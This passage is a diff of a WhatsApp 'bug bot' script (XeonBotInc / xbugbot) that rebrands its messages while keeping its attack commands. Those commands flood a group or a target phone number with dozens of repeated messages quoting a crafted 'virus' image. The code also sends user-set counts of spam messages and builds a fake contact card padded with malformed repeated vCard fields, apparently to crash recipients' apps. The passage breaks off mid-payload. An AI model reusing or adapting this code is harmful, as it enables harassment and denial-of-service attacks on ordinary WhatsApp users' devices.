-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:gcinfinitexeon})
             break
 case 'pcfast':               
            	
@@ -6910,36 +6913,36 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcinfinite 91xxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `🐱WH173 5P1D3Rxbugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
                 }
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcinfinitexeon})
             reply(mess.success)
             break
                    case 'pcgcfast':               
@@ -6956,65 +6959,65 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcinfinite 91xxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `🐱WH173 5P1D3Rxbugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
                 }
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"W5 BOT"},{quoted:pcgcinfinitexeon})
             break
 case 'gcbunny': {            
            	
@@ -7047,7 +7050,7 @@ case 'gcbunny': {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `🐱WH173 5P1D3Rxbugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
@@ -7090,7 +7093,7 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbunny 91xxxxxxxxxx`
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `🐱WH173 5P1D3Rxbugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
@@ -7140,7 +7143,7 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcbunny 91xxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `🐱WH173 5P1D3Rxbugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
@@ -7173,8 +7176,8 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcbunny 91xxxxxxxxx
 if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-kwkwkx = '``🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot``',
-XeonBotInc.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Xeon Ezy☣️',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
+kwkwkx = '``🐱WH173 5P1D3Rxbugbot``',
+XeonBotInc.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'W5 BOT',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
 }
 }
 break
@@ -7184,7 +7187,7 @@ case 'pccontact': {
 if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-const fakeContacts = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Xeon Ezy☣️\nitem1.TEL:+916909137213\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 